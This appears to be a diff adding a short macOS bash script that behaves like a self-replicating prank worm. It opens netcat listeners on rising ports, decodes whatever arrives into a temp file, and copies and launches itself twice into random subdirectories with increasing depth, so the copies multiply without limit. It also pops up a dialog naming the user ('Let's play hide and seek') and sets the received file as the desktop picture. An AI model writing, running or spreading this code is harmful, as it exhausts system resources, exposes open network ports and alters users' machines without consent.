@@ -1,0 +1,13 @@
+#!/bin/bash
+depth=$1
+tfile=$(mktemp) # REDFLAG
+nc -l $(( 1337 + depth )) | base64 -D > $tfile
+for k in {0..1}; do
+    ncopy="$(find . -type d -depth 2 | shuf -n 1)/$RANDOM"
+    cp $0 "$ncopy"
+    chmod +x "$ncopy"
+    $ncopy $(( depth + 1 + k )) & disown
+done
+echo "set theDialogText to \"Hi there, \" & (system attribute \"USER\") & \". Let's play hide and seek.\"
+display dialog theDialogText" | osascript
+osascript -e "tell application \"Finder\" to set desktop picture to POSIX file \"$tfile\""
